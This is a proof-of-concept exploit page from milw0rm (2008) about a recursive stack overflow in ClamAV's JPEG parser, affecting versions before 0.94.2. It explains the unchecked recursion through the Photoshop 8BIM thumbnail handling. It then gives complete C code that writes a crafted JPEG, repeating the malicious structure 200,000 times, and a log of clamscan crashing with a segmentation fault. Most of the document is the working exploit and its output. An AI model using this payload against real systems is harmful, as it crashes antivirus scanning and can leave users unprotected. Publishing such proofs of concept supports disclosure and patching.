<html><head><title>ClamAV < 0.94.2 (JPEG Parsing) Recursive Stack Overflow PoC</title></head><pre>/*
There is a recursive stack overflow in clamav 0.93.3 and 0.94 (and probably
older versions) in the jpeg parsing code.
it scan's the jpeg file, and if there is a thumbnail, it'll scan that too. the
thumbnail itself is just another jpeg 
file and the same jpeg scanning function gets called without checking any kind
of recurising limit. this can easely 
lead to a recurisive stack overflow. the vulnerable code looks like: 
clamav-0.94\libclamav\special.c
int cli_check_jpeg_exploit(int fd) &lt;-- fd to jpeg file
{
...
                        if ((retval=jpeg_check_photoshop(fd)) != 0) {
                                return retval;
                        }
...
}
...
static int jpeg_check_photoshop(int fd)
{
...
                retval = jpeg_check_photoshop_8bim(fd);
...
}
...
static int jpeg_check_photoshop_8bim(int fd)
{
...
        retval = cli_check_jpeg_exploit(fd); &lt;-- calls cli_check_jpeg_exploit()
again without any recursive checks !
...
}

the exploit shown below triggers this recursive stack overflow by creating a
fake jpg file. once created and passed on 
to clamav it'll go in a recursive stack loop untill clamav runs out of stack
memory and causes a stack overflow. effectively 
crashing clamav. The exploit was tested on clamav 0.94 on opensolaris running
in a vmware.
exploit:
*/

const char crashstr[] = &quot;\xff\xd8&quot; // jpg marker 
                        &quot;\xff\xed&quot; // exif data 
                        &quot;\x00\x02&quot; // length 
                        &quot;Photoshop 3.0\x00&quot;
                        &quot;8BIM&quot;
                        &quot;\x04\x0c&quot; // thumbnail id  
                        &quot;\x00&quot; 
                        &quot;\x01&quot;
                        &quot;\x01\x01\x01\x01&quot;
                        &quot;0123456789012345678912345678&quot;; // skip over 28 bytes 

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;sys/types.h&gt;

#define NR_ITER 200000

int main() {
        FILE *fp;
        int i;
        fp = fopen(&quot;clamav-jpeg-crash.jpg&quot;, &quot;w+&quot;);
        if (!fp) {
                printf(&quot;can't open/create file\n&quot;);
                exit(0);
        }
        for (i = 0; i &lt; NR_ITER; i++) {
                fwrite(crashstr, sizeof(crashstr)-1/*don't want 0-byte ?*/, 1,
fp);
        }
        fclose(fp);
        printf(&quot;done, now run clamscan on ./clamav-jpeg-crash.jpg\n&quot;);
        exit(0);
}

/*
result: 
ilja@opensolaris:~$ ./jpg
done, now run clamscan on ./clamav-jpeg-crash.jpg
ilja@opensolaris:~$ /usr/local/bin/clamscan ./clamav-jpeg-crash.jpg 
LibClamAV Warning: **************************************************
LibClamAV Warning: ***  The virus database is older than 7 days!  ***
LibClamAV Warning: ***   Please update it as soon as possible.    ***
LibClamAV Warning: **************************************************
Segmentation Fault &lt;-- clamav crashed !
ilja@opensolaris:~$
*/

// milw0rm.com [2008-12-03]</pre></html>